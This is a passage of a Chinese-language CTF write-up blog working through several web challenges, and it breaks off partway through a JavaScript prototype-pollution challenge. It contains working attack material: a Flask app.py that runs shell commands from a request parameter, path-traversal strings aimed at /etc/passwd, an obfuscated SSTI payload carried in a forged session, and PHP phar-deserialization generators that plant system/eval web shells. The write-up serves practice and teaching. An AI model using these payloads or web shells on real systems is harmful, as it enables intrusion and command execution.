class="string">&#x27;get&#x27;</span>,inject_param=inject_param,data=data)</span><br><span class="line">    <span class="comment"># 获取数据库列表</span></span><br><span class="line">    <span class="comment">#inj.handle_value(g.db_names)</span></span><br><span class="line">    <span class="comment">#information_schema,mysql,performance_schema,sys,test,ctf</span></span><br><span class="line">    <span class="comment"># 根据数据库获取表名</span></span><br><span class="line">    <span class="comment">#inj.handle_value(g.table_name_in_db2, &#x27;ctf&#x27;)</span></span><br><span class="line">    <span class="comment">#items</span></span><br><span class="line">    <span class="comment"># 获取表的字段</span></span><br><span class="line">    <span class="comment">#inj.handle_value(g.column_name_in_table,&#x27;items&#x27;)</span></span><br><span class="line">    <span class="comment">#id,name,price</span></span><br><span class="line">    <span class="comment"># 最后取数据</span></span><br><span class="line">    inj.handle_value(g.column_value_in_table,<span class="string">&#x27;ctf.items&#x27;</span>,<span class="string">&#x27;name&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/13/664232872f5c0.png" alt="image-20240205192402524"></p>
<p>flag{9197eb45-96a5-45b5-807d-ac6db0c1163d}</p>
<p>第二个脚本报错：未解析的引用 ‘Injector’ 懵了 有这个类啊</p>
<p>找到问题了 是格式错了</p>
<p>又说我 未使用的 import 语句 ‘re’</p>
<p>还有’Gadget’ object has no attribute ‘column_value_in_table’</p>
<p>先这样吧</p>
<h3 id="flask-disk"><a href="#flask-disk" class="headerlink" title="flask disk"></a>flask disk</h3><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/13/6641fa94cdba8.png" alt="image-20240218121532061"></p>
<p>list files:</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/13/6641fa94115ce.png" alt="image-20240218121615441"></p>
<p>upload files:</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/13/6641fa9417710.png" alt="image-20240218121712990"></p>
<p>可以上传个什么东西</p>
<p>admin manage：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/13/6641fa97dcfb6.png" alt="image-20240218121831105"></p>
<p>可以上传Pin码</p>
<p>要输入pin码，说明flask开启了debug模式。flask开启了debug模式下，app.py源文件被修改后会立刻加载。所以只需要上传一个能rce的app.py文件把原来的覆盖，就可以了</p>
<p>所以：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask,request</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():    </span><br><span class="line">    <span class="keyword">try</span>:        </span><br><span class="line">        cmd = request.args.get(<span class="string">&#x27;cmd&#x27;</span>)        </span><br><span class="line">        data = os.popen(cmd).read()        </span><br><span class="line">        <span class="keyword">return</span> data    </span><br><span class="line">    <span class="keyword">except</span>:        </span><br><span class="line">        <span class="keyword">pass</span>    </span><br><span class="line">        </span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;1&quot;</span></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&#x27;__main__&#x27;</span>:    </span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>,port=<span class="number">5000</span>,debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure>

<p>上传这个</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/13/6641fa9430d58.png" alt="image-20240218130640300"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/13/6641fa94e23af.png" alt="image-20240218131653210"></p>
<p>直接命令执行</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/13/6641fa96c3ff6.png" alt="image-20240218131354399"></p>
<p>没回显</p>
<p>懵了</p>
<p>试了%20 不行</p>
<p>什么鬼</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/13/6641fa99efa18.png" alt="image-20240218132947482"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/13/6641fa9494d44.png" alt="image-20240218133447940"></p>
<p>文件名字问题 要把原来的app.py覆盖 要名字一样</p>
<h3 id="InjectMe"><a href="#InjectMe" class="headerlink" title="InjectMe"></a>InjectMe</h3><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/13/6641fa9b90c12.png" alt="image-20240218144557506"></p>
<p>发现图片可以点击</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/13/6641fa944559c.png" alt="image-20240218153841220"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/13/6641fa97310ee.png" alt="image-20240218153916167"></p>
<p>110.jpg中有源码</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/13/6641fa97928e0.png" alt="image-20240218154053380"></p>
<p>将..&#x2F;替代为空</p>
<p>且在download路由下</p>
<p>猜到运行文件，以及后面审计源码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">..././..././..././etc/passwd</span><br><span class="line">..././..././..././app/app.py</span><br><span class="line">..././..././..././etc/config.py</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/13/6641fa9b05166.png" alt="image-20240218160623172"></p>
<p>&#x2F;download?file&#x3D;&#x2F;app&#x2F;app.py</p>
<p>拿到源码</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, render_template, request, abort, send_file, session, render_template_string</span><br><span class="line"><span class="keyword">from</span> config <span class="keyword">import</span> secret_key</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.secret_key = secret_key</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hello_world</span>():  <span class="comment"># put application&#x27;s code here</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/cancanneed&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cancanneed</span>():</span><br><span class="line">    all_filename = os.listdir(<span class="string">&#x27;./static/img/&#x27;</span>)</span><br><span class="line">    filename = request.args.get(<span class="string">&#x27;file&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> filename:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;img.html&#x27;</span>, filename=filename, all_filename=all_filename)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">f&quot;<span class="subst">&#123;<span class="built_in">str</span>(os.listdir(<span class="string">&#x27;./static/img/&#x27;</span>))&#125;</span> &lt;br&gt; &lt;a href=\&quot;/cancanneed?file=1.jpg\&quot;&gt;/cancanneed?file=1.jpg&lt;/a&gt;&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/download&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">download</span>():</span><br><span class="line">    filename = request.args.get(<span class="string">&#x27;file&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> filename:</span><br><span class="line">        filename = filename.replace(<span class="string">&#x27;../&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        filename = os.path.join(<span class="string">&#x27;static/img/&#x27;</span>, filename)</span><br><span class="line">        <span class="built_in">print</span>(filename)</span><br><span class="line">        <span class="keyword">if</span> (os.path.exists(filename)) <span class="keyword">and</span> (<span class="string">&quot;start&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> filename):</span><br><span class="line">            <span class="keyword">return</span> send_file(filename)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            abort(<span class="number">500</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        abort(<span class="number">404</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/backdoor&#x27;</span>, methods=[<span class="string">&quot;GET&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">backdoor</span>():</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="built_in">print</span>(session.get(<span class="string">&quot;user&quot;</span>))</span><br><span class="line">        <span class="keyword">if</span> session.get(<span class="string">&quot;user&quot;</span>) <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">            session[<span class="string">&#x27;user&#x27;</span>] = <span class="string">&quot;guest&quot;</span></span><br><span class="line">        name = session.get(<span class="string">&quot;user&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> re.findall(</span><br><span class="line">                <span class="string">r&#x27;__|&#123;&#123;|class|base|init|mro|subclasses|builtins|globals|flag|os|system|popen|eval|:|\+|request|cat|tac|base64|nl|hex|\\u|\\x|\.&#x27;</span>,</span><br><span class="line">                name):</span><br><span class="line">            abort(<span class="number">500</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> render_template_string(</span><br><span class="line">                <span class="string">&#x27;竟然给&lt;h1&gt;%s&lt;/h1&gt;你找到了我的后门，你一定是网络安全大赛冠军吧！😝 &lt;br&gt; 那么 现在轮到你了!&lt;br&gt; 最后祝您玩得愉快!😁&#x27;</span> % name)</span><br><span class="line">    <span class="keyword">except</span> Exception:</span><br><span class="line">        abort(<span class="number">500</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.errorhandler(<span class="params"><span class="number">404</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">page_not_find</span>(<span class="params">e</span>):</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;404.html&#x27;</span>), <span class="number">404</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.errorhandler(<span class="params"><span class="number">500</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">internal_server_error</span>(<span class="params">e</span>):</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;500.html&#x27;</span>), <span class="number">500</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">8080</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>明显重点在backdoor函数上</p>
<p>download?file&#x3D;&#x2F;app&#x2F;config.py</p>
<p>拿到secret_key</p>
<p>secret_key &#x3D; “y0u_n3ver_k0nw_s3cret_key_1s_newst4r”</p>
<p>这里又需要让session的值可控，session伪造无疑了</p>
<p>然后禁用了一大堆ssti函数，肯定是要打ssti了</p>
<p>所以</p>
<p>用 flask_session_cookie_manager3.py</p>
<p>#解密：python flask_session_cookie_manager3.py decode -s “secret_key” -c “需要解密的session值”</p>
<p>#加密：python flask_session_cookie_manager3.py encode -s “secret_key” -t “需要加密的session值”</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&#x27;user&#x27;:&#x27;&#123;%print(((g[\&#x27;pop\&#x27;][\&#x27;_\&#x27;*2~\&#x27;g\&#x27;\&#x27;lobals\&#x27;~\&#x27;_\&#x27;*2][\&#x27;_\&#x27;*2~\&#x27;b\&#x27;\&#x27;uiltins\&#x27;~\&#x27;_\&#x27;*2][\&#x27;_\&#x27;*2~\&#x27;import\&#x27;~\&#x27;_\&#x27;*2](\&#x27;OS\&#x27;|lower)[\&#x27;p\&#x27;\&#x27;open\&#x27;](\&#x27;CAT /y*\&#x27;|lower))[\&#x27;read\&#x27;]()))%&#125;&#x27;&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/13/6641fa9544a11.png" alt="image-20240218184409297"></p>
<p>吐了</p>
<p>伪造后的session：.eJy1kD0OwjAMhe9iqVK7uYltJM6ShYGBBaFSpEqld6d26v7QDiwsVhK_9_k5Pbye1wbO0BeP5nZvy67r3pe2bcoEKdXx5IVrLeInoVUXqkMLmU-FbNegpfY3iT8SiH3eMtnemDeEnVnnCc_ZaYOxVf6UIatlte4-XQ5hQvQfkvD9swl57KKtkiVxuqICMG-xAHDOJRsvRQ-jeCRtsOHDAS84xRxEjholUFXFAMMHKM2ZMA.ZVd5wg.NN4PVUmSQiA6Ll-XV1SkJq_5b50<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/13/66423286e2626.png" alt="image-20240218190941456"></p>
<h3 id="PharOne"><a href="#PharOne" class="headerlink" title="PharOne"></a>PharOne</h3><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/13/6641fa9898daa.png" alt="image-20240218191233468"></p>
<p>初始界面有个文件上传功能</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/14/664379d338e70.png" alt="image-20240218191503324"></p>
<p>提示class.php</p>
<p>访问</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/13/6641fa946784e.png" alt="image-20240218191802832"></p>
<p>一眼phar反序列化</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cmd</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;cmd = <span class="string">&quot;echo &#x27;&lt;?=system(\$_POST[1]);?&gt;&#x27;&gt;/var/www/html/1.php&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">Flag</span>();</span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&#x27;A.phar&#x27;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&#x27;test.txt&#x27;</span>,<span class="string">&#x27;test&#x27;</span>); </span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&#x27;&lt;?php __HALT_COMPILER(); ? &gt;&#x27;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>题目对__HALT_COMPILER()进行了过滤，可以使用gzip等压缩进行绕过</p>
<p>直接</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$cmd</span> = <span class="string">&quot;echo \&quot;&lt;?=@eval(\\\$_POST[&#x27;a&#x27;]);\&quot;&gt;/var/www/html/1.php&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    @<span class="title function_ invoke__">unlink</span>(<span class="string">&quot;1.phar&quot;</span>);</span><br><span class="line">    <span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&quot;1.phar&quot;</span>);</span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&quot;__HALT_COMPILER(); ?&gt;&quot;</span>);</span><br><span class="line">    <span class="variable">$o</span> = <span class="keyword">new</span> <span class="title class_">Flag</span>();</span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$o</span>);</span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;test&quot;</span>);</span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br><span class="line">    <span class="title function_ invoke__">system</span>(<span class="string">&quot;gzip 1.phar&quot;</span>);</span><br><span class="line">    <span class="title function_ invoke__">rename</span>(<span class="string">&quot;1.phar.gz&quot;</span>,<span class="string">&quot;1.jpg&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>上传1.jpg文件</p>
<p>在class.php触发phar反序列化</p>
<p>rce拿到flag</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/13/6641fa94c36b1.png" alt="image-20240218195221434"></p>
<p>整个题理解还是差不多 但是对phar反序列化还是存在一些问题</p>
<h3 id="OtenkiBoy"><a href="#OtenkiBoy" class="headerlink" title="OtenkiBoy"></a>OtenkiBoy</h3><p>也是javascript原型链污染</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/13/6641fa9b8fd72.png" alt="image-20240218200553004"></p>
<p>是week3中Otenkgirl的升级版</p>
<p>依旧是两个主要的文件，info.js,submit.js，但这次的geiinfo（）函数没有那么简单能够利用了，config文件和default_config 文件中都有min_public_time。</p>
<p>info.js中仍有:</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/14/664379d3e01d8.png" alt="image-20240218202954663"></p>
<p>明显minTimestamp与函数createDate有关</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="title function_">createDate</span> = (<span class="params">str, opts</span>) =&gt; &#123;</span><br><span class="line">    <span class="keyword">const</span> <span class="title class_">CopiedDefaultOptions</span> = <span class="title function_">copyJSON</span>(<span class="variable constant_">DEFAULT_CREATE_DATE_OPTIONS</span>)</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">typeof</span> opts === <span class="string">&quot;undefined&quot;</span>) opts = <span class="title class_">CopiedDefaultOptions</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">typeof</span> opts !== <span class="string">&quot;object&quot;</span>) opts = &#123; ...<span class="title class_">CopiedDefaultOptions</span>, <span class="attr">UTC</span>: <span class="title class_">Boolean</span>(opts) &#125;;</span><br><span class="line">    opts.<span class="property">UTC</span> = <span class="keyword">typeof</span> opts.<span class="property">UTC</span> === <span class="string">&quot;undefined&quot;</span> ? <span class="title class_">CopiedDefaultOptions</span>.<span class="property">UTC</span> : <span class="title class_">Boolean</span>(opts.<span class="property">UTC</span>);</span><br><span class="line">    opts.<span class="property">format</span> = opts.<span class="property">format</span> || <span class="title class_">CopiedDefaultOptions</span>.<span class="property">format</span>;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="title class_">Array</span>.<span class="title function_">isArray</span>(opts.<span class="property">format</span>)) opts.<span class="property">format</span> = [opts.<span class="property">format</span>]</span><br><span class="line">    opts.<span class="property">format</span> = opts.<span class="property">format</span>.<span class="title function_">filter</span>(<span class="function"><span class="params">f</span> =&gt;</span> <span class="keyword">typeof</span> f === <span class="string">&quot;string&quot;</span>)</span><br><span class="line">        .<span class="title function_">filter</span>(<span class="function"><span class="params">f</span> =&gt;</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="regexp">/yy|yyyy|MM|dd|HH|mm|ss|fff/</span>.<span class="title function_">test</span>(f) === <span class="literal">false</span>) &#123;</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">warn</span>(<span class="string">`Invalid format &quot;<span class="subst">$&#123;f&#125;</span>&quot;.`</span>, <span class="string">`At least one format specifier is required.`</span>);</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (<span class="string">`|<span class="subst">$&#123;f&#125;</span>|`</span>.<span class="title function_">replace</span>(<span class="regexp">/yyyy/g</span>, <span class="string">&quot;yy&quot;</span>).<span class="title function_">split</span>(<span class="regexp">/yy|MM|dd|HH|mm|ss|fff/</span>).<span class="title function_">includes</span>(<span class="string">&quot;&quot;</span>)) &#123;</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">warn</span>(<span class="string">`Invalid format &quot;<span class="subst">$&#123;f&#125;</span>&quot;.`</span>, <span class="string">`Delimeters are required between format specifiers.`</span>);</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (f.<span class="title function_">includes</span>(<span class="string">&quot;yyyy&quot;</span>) &amp;&amp; f.<span class="title function_">replace</span>(<span class="regexp">/yyyy/g</span>, <span class="string">&quot;&quot;</span>).<span class="title function_">includes</span>(<span class="string">&quot;yy&quot;</span>)) &#123;</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">warn</span>(<span class="string">`Invalid format &quot;<span class="subst">$&#123;f&#125;</span>&quot;.`</span>, <span class="string">`&quot;yyyy&quot; and &quot;yy&quot; cannot be used together.`</span>);</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;)</span><br><span class="line">    opts.<span class="property">baseDate</span> = <span class="keyword">new</span> <span class="title class_">Date</span>(opts.<span class="property">baseDate</span> || <span class="title class_">Date</span>.<span class="title function_">now</span>());</span><br><span class="line"></span><br><span class="line">    <span class="comment">// number</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">typeof</span> str === <span class="string">&quot;number&quot;</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Date</span>(str);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="keyword">typeof</span> str === <span class="string">&quot;string&quot;</span>) &#123;</span><br><span class="line">        <span class="comment">// number string</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="regexp">/^\-?\d+$/</span>.<span class="title function_">test</span>(str.<span class="title function_">trim</span>())) <span class="keyword">return</span> <span class="title function_">createDate</span>(<span class="title class_">Number</span>(str.<span class="title function_">trim</span>()));</span><br><span class="line"></span><br><span class="line">        <span class="comment">// utility functions</span></span><br><span class="line">        <span class="keyword">const</span> <span class="title function_">isLeapYear</span> = year =&gt; (year % <span class="number">4</span> == <span class="number">0</span> &amp;&amp; year % <span class="number">100</span> != <span class="number">0</span>) || (year % <span class="number">400</span> == <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">const</span> <span class="title function_">MonthDay</span> = (<span class="params">mon, year</span>) =&gt; [<span class="number">31</span>, <span class="title function_">isLeapYear</span>(year) ? <span class="number">29</span> : <span class="number">28</span>, <span class="number">31</span>, <span class="number">30</span>, <span class="number">31</span>, <span class="number">30</span>, <span class="number">31</span>, <span class="number">31</span>, <span class="number">30</span>, <span class="number">31</span>, <span class="number">30</span>, <span class="number">31</span>][mon - <span class="number">1</span>]</span><br><span class="line">        <span class="keyword">const</span> <span class="title function_">pad</span> = (<span class="params">n, len</span>) =&gt; <span class="title class_">String</span>(n).<span class="title function_">padStart</span>(len, <span class="string">&quot;0&quot;</span>)</span><br><span class="line">        <span class="keyword">const</span> <span class="title function_">getYMD</span> = (<span class="params">date</span>) =&gt; &#123;</span><br><span class="line">            <span class="keyword">let</span> regres = <span class="regexp">/^(\d+) *(\-|\/) *(\d+) *(\-|\/) *(\d+)$/</span>.<span class="title function_">exec</span>(date.<span class="title function_">trim</span>())</span><br><span class="line">            <span class="keyword">if</span> (regres === <span class="literal">null</span>) <span class="keyword">return</span> &#123;&#125;</span><br><span class="line">            <span class="keyword">const</span> [n1, n2, n3] = [regres[<span class="number">1</span>], regres[<span class="number">3</span>], regres[<span class="number">5</span>]].<span class="title function_">map</span>(<span class="title class_">Number</span>);</span><br><span class="line">            <span class="keyword">if</span> (<span class="number">1</span> &lt;= n2 &amp;&amp; n2 &lt;= <span class="number">12</span> &amp;&amp; <span class="number">1</span> &lt;= n3 &amp;&amp; n3 &lt;= <span class="title class_">MonthDay</span>(n2, n1)) &#123;</span><br><span class="line">                <span class="comment">// 2020-12-31</span></span><br><span class="line">                <span class="keyword">let</span> yyyy = <span class="title function_">pad</span>(n1, <span class="number">1</span>), <span class="variable constant_">MM</span> = <span class="title function_">pad</span>(n2, <span class="number">2</span>), dd = <span class="title function_">pad</span>(n3, <span class="number">2</span>);</span><br><span class="line">                <span class="keyword">return</span> &#123; yyyy, <span class="variable constant_">MM</span>, dd &#125;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="number">1</span> &lt;= n1 &amp;&amp; n1 &lt;= <span class="number">12</span> &amp;&amp; <span class="number">1</span> &lt;= n2 &amp;&amp; n2 &lt;= <span class="title 